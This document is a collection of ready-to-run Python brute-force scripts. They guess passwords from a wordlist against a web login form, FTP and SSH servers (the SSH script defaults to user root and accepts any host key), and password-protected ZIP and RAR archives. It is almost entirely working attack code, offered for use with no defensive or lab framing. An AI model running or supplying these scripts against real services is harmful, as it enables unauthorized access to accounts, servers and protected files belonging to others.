## 1. Basic HTTP Login Brute Forcer Python)
This script tries different username/password combinations for a web login form.

```python
import requests

url = 'http://example.com/login'
username = 'admin'
password_file = 'passwords.txt'

with open(password_file, 'r') as file:
    for password in file:
        password = password.strip()
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data)
        
        if "Login failed" not in response.text:  # Adjust based on the site response
            print(f'[+] Password found: {password}')
            break
        else:
            print(f'[-] Attempted password: {password}')
```
## 2. FTP Brute Force Script (Python using ftplib)
Brute force FTP login credentials.

```python
import ftplib

def ftp_brute_force(host, username, password_file):
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                ftp = ftplib.FTP(host)
                ftp.login(username, password)
                print(f'[+] Password found: {password}')
                ftp.quit()
                return True
            except ftplib.error_perm:
                print(f'[-] Attempted password: {password}')
    return False

host = 'ftp.example.com'
username = 'admin'
password_file = 'passwords.txt'

ftp_brute_force(host, username, password_file)
```
## 3. SSH Brute Force (Python using Paramiko)
For brute-forcing SSH credentials.

```python
import paramiko

def ssh_brute_force(host, username, password_file):
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, username=username, password=password)
                print(f'[+] Password found: {password}')
                ssh.close()
                return True
            except paramiko.AuthenticationException:
                print(f'[-] Attempted password: {password}')
    return False

host = 'ssh.example.com'
username = 'root'
password_file = 'passwords.txt'

ssh_brute_force(host, username, password_file)
```
## 4. ZIP File Password Brute Forcer (Python using zipfile)
Brute force a password-protected ZIP file.

```python
import zipfile

def zip_brute_force(zip_file, password_file):
    zip_ref = zipfile.ZipFile(zip_file)
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                zip_ref.extractall(pwd=bytes(password, 'utf-8'))
                print(f'[+] Password found: {password}')
                return True
            except:
                print(f'[-] Attempted password: {password}')
    return False

zip_file = 'secret.zip'
password_file = 'passwords.txt'

zip_brute_force(zip_file, password_file)
```

## RAR Brute F0rcing
```python
import rarfile

def rar_brute_force(rar_file, password_file):
    rf = rarfile.RarFile(rar_file)
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                rf.extractall(pwd=password)
                print(f'[+] Password found: {password}')
                return True
            except rarfile.BadRarFile:
                print('[-] Bad RAR file format')
                return False
            except rarfile.RarWrongPassword:
                print(f'[-] Attempted password: {password}')
            except Exception as e:
                print(f'[!] Error: {e}')
    return False

rar_file = 'protected.rar'
password_file = 'passwords.txt'

rar_brute_force(rar_file, password_file)
```
